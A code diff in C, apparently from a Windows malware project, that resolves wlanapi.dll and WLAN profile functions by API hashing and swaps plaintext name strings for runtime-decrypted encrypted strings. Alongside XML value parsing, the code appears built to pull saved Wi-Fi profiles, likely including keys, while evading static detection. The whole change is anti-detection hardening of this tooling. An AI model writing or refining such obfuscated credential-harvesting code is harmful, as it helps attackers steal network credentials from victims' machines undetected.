@@ -71,16 +71,23 @@ static int wf_ensure_api(void) {
     wlan_api.fnHF = (wf_HF)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
     if (!wlan_api.fnGH || !wlan_api.fnHA || !wlan_api.fnHF) return 0;
 
-    /* ponytail: plaintext "wlanapi.dll", move to enc_strings.h later */
-    void *wlan = mirage_get_module_by_hash(mirage_encrypted_hash_module("wlanapi.dll"));
+    char _wl[32]; enc_decrypt(enc_wlanapi, ENC_WLANAPI_LEN, _wl);
+    void *wlan = mirage_get_module_by_hash(mirage_encrypted_hash_module(_wl));
     if (!wlan) return 0;
 
-    wlan_api.fnOpen  = (wf_Open)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func("WlanOpenHandle"));
-    wlan_api.fnEnum  = (wf_Enum)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func("WlanEnumInterfaces"));
-    wlan_api.fnGPL   = (wf_GPList)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func("WlanGetProfileList"));
-    wlan_api.fnGP    = (wf_GP)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func("WlanGetProfile"));
-    wlan_api.fnFree  = (wf_Free)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func("WlanFreeMemory"));
-    wlan_api.fnClose = (wf_Close)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func("WlanCloseHandle"));
+    char _fn[64];
+    enc_decrypt(enc_WlanOpenHandle, ENC_WLANOPENHANDLE_LEN, _fn);
+    wlan_api.fnOpen  = (wf_Open)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func(_fn));
+    enc_decrypt(enc_WlanEnumInterfaces, ENC_WLANENUMINTERFACES_LEN, _fn);
+    wlan_api.fnEnum  = (wf_Enum)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func(_fn));
+    enc_decrypt(enc_WlanGetProfileList, ENC_WLANGETPROFILELIST_LEN, _fn);
+    wlan_api.fnGPL   = (wf_GPList)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func(_fn));
+    enc_decrypt(enc_WlanGetProfile, ENC_WLANGETPROFILE_LEN, _fn);
+    wlan_api.fnGP    = (wf_GP)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func(_fn));
+    enc_decrypt(enc_WlanFreeMemory, ENC_WLANFREEMEMORY_LEN, _fn);
+    wlan_api.fnFree  = (wf_Free)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func(_fn));
+    enc_decrypt(enc_WlanCloseHandle, ENC_WLANCLOSEHANDLE_LEN, _fn);
+    wlan_api.fnClose = (wf_Close)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func(_fn));
 
     if (!wlan_api.fnOpen || !wlan_api.fnEnum || !wlan_api.fnGPL ||
         !wlan_api.fnGP || !wlan_api.fnFree || !wlan_api.fnClose)
@@ -108,7 +115,7 @@ static const char *xml_get_value(const char *xml, const char *tag, size_t *vlen)
 
 static void wide_to_narrow(const WCHAR *src, char *dst, size_t dst_size) {
     size_t i = 0;
-    for (; i < dst_size - 1 && src[i]; i++) dst[i] = (char)(src[i] & 0x7F);
+    for (; i < dst_size - 1 && src[i]; i++) dst[i] = (src[i] < 0x80) ? (char)src[i] : '?';
     dst[i] = '\0';
 }
 
